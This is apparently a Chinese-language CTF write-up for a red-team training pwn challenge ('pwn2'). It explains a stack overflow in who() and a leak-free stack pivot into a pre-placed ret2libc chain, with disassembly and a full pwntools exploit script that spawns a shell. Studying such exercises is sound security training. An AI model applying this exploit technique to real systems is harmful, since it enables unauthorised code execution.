---
title: "pwn-1 (pwn2)"
ctf: "中电联培训 2026（红队考题）"
date: 2026-07-20
category: pwn
difficulty: medium
points: N/A
flag_format: "flag{...}"
author: "tsshe"
---

# pwn-1（pwn2）

## 题目概述

二进制 `pwn2` 为 amd64 架构、关闭 PIE（基址固定 `0x400000`）、开启 NX、Partial RELRO、**无 canary**。
漏洞点位于 `who()`，存在栈溢出，但二进制内**没有** `pop rdi` / `syscall` / ret2csu 这类常规设参 gadget。

利用思路：借助 `who()` 末尾的 `leave;ret` 配合二进制中唯一的一个干净 `ret` gadget（0x4010a4），
把栈"迁移"（stack pivot）到我们在 `vuln()` 缓冲区里提前布置好的 ROP 链，从而执行 `system("/bin/sh")`，
**整个过程无需任何 libc 地址泄漏**（本地 libc 基址通过 `/proc/<pid>/maps` 直接拿到）。

## 解题步骤

### 第一步：信息收集——保护机制与"伪泄漏"

`checksec` 结果：No PIE（基址 `0x400000`）、NX、Partial RELRO、**无 canary**。

`who()` @ `0x401156` 的反汇编如下：

```nasm
0x40117d: lea rax, [rbp - 0x10]
0x401181: mov edx, 0x20          ; 0x20 = 32 字节
0x401189: mov edi, 0
0x40118e: call read             ; read(0, rbp-0x10, 0x20)  -> 缓冲区仅 16 字节，却读 32 => 溢出
0x401194: leave                  ; mov rsp, rbp ; pop rbp
0x401195: ret
```

缓冲区实际只有 16 字节（`rbp-0x10`），却读了 32 字节，因此我们能覆盖 `saved rbp`（8 字节）+ `返回地址`（8 字节）。

二进制里**没有** `pop rdi/rsi/rdx`、没有 `syscall`、也没有 `__libc_csu_init` 系列 gadget，
只有一个干净 `ret`（@ `0x4010a4`）以及 `leave;ret`。

`main()` 中有 `printf("Here's your gift: %p", GOT[0])`。泄漏出来的是 `GOT[0]` = `.dynamic`
（一个固定的二进制地址），所以这个"gift"**并不是可用的 libc 泄漏**，不能用来算 libc 基址。

### 第二步：无泄漏的栈迁移（stack pivot）

`vuln()` 开头会执行 `read(0, rbp-0x100, 0x100)`。我们利用这一次 read，把整条 ROP 链写进位于
`vuln_rbp - 0x100` 的 256 字节缓冲区——这个位置在 `who()` 调用栈帧的**下方**，所以后续 `who()`
里的溢出不会把它冲掉。

在 `who()` 的溢出里，我们填入：`16 字节填充 + 伪造 saved rbp (0xdeadbeef) + 返回地址 = 0x4010a4`
（即那个唯一的 `ret`）。栈的走向推导如下：

- `who_rbp = vuln_rbp - 0x110`（`vuln` 栈帧 0x100，加上 `call` 压入的返回槽 + `push rbp`）。
- `who` 的 `leave;ret` → `mov rsp, rbp; pop rbp; ret`，使 rsp 落到 `who_rbp + 8`。
- `0x4010a4` 处的 `ret` 再弹出一个 qword，rsp 变为 `who_rbp + 16`
  = **`vuln_rbp - 0x100`** —— 恰好就是之前布置好的那条 ROP 链的起点。

于是链 `pop rdi; ret` → `/bin/sh` → `system` 顺利执行。由于
`chain_start % 16 == 0`，`system` 进入时 `rsp % 16 == 8`（这是 ABI 要求的正确值），
因此**不需要额外的 `ret` 做栈对齐**。

```python
from pwn import *
context.update(arch="amd64", os="linux", log_level="info")

BINARY = "./pwn2"
RET_GADGET = 0x4010a4        # 唯一的干净 `ret`，用于迁移到已布置好的链

p = process(BINARY)
libc = p.libc               # 本地：基址由 /proc/<pid>/maps 直接解析，无需泄漏

pop_rdi = next(libc.search(b"\x5f\xc3"))     # pop rdi ; ret
bin_sh  = next(libc.search(b"/bin/sh\x00"))
system  = libc.sym["system"]
chain = flat([pop_rdi, bin_sh, system])

p.recvuntil(b"What's you want to tell me?")
p.send(chain)                                       # 24 字节 -> vuln 的 0x100 read 立即返回

p.recvuntil(b"Who you are?")
payload = flat([b"A" * 16, 0xdeadbeef, RET_GADGET]) # 16 填充 + 伪造 rbp + ret gadget
assert len(payload) == 32
p.send(payload)                                      # 触发栈迁移

p.interactive()                                      # -> 拿到 shell
```

### 第三步：用题目提供的 libc 运行

如果 `pwn2` 在本机 glibc 下无法启动（版本不匹配导致一启动就崩），需把它绑定到题目提供的
`libc.so.6`（同时需要配套的 `ld-linux`）：

```bash
patchelf --set-interpreter ./ld-linux-x86-64.so.2 \
         --replace-needed libc.so.6 ./libc.so.6 ./pwn2
python3 exploit.py
```

拿到 shell 后读取 flag（用 `id` 确认权限）：

```text
$ id
uid=1000(ctf) gid=1000(ctf) ...
$ cat flag
flag{...}            # 通过上述栈迁移 + ret2libc 链获取
```

## Flag

```
flag{...}            # 在弹出的 shell 内用 `cat flag` 读取
```

> **远端注意事项：** 题目里的"gift"泄漏的是 `.dynamic`，并非 libc 地址，因此打远端时，
> 在复用同一条 pivot 链之前，需要先拿到一个真实的 libc 泄漏（例如 ret2dlresolve，
> 或再发起一次 `read` 泄漏一个 libc 指针）。`exploit.py` 里保留了 `REMOTE` 模式框架以备后续扩展。
